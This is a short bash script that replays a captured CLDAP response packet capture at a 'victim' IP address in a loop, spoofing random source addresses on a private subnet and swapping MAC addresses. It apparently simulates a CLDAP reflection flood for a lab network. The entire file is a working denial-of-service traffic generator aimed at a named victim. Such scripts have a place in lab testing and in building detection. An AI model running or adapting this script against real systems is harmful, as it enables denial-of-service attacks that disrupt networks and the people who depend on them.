#!/bin/bash

VICTIM="$1" # Victim IP address
LOOPS="$2"

tcpprep -c 192.168.122.161 -o cldap.cach -i cldap-response.pcap

while [ $LOOPS -gt 0 ]
do
     IP=$(echo $((RANDOM%254 + 1)))
     tcpreplay-edit --endpoints="$VICTIM":"192.168.122.$IP" \
     --enet-dmac=52:54:00:a9:3f:df,52:54:00:2d:4c:c4 \
     --enet-smac=52:54:00:2d:4c:c4,52:54:00:a9:3f:df \
     -t -K -i eth0 -I eth0 \
     -c cldap.cach cldap-response.pcap

    LOOPS=$(( $LOOPS - 1 ))
done
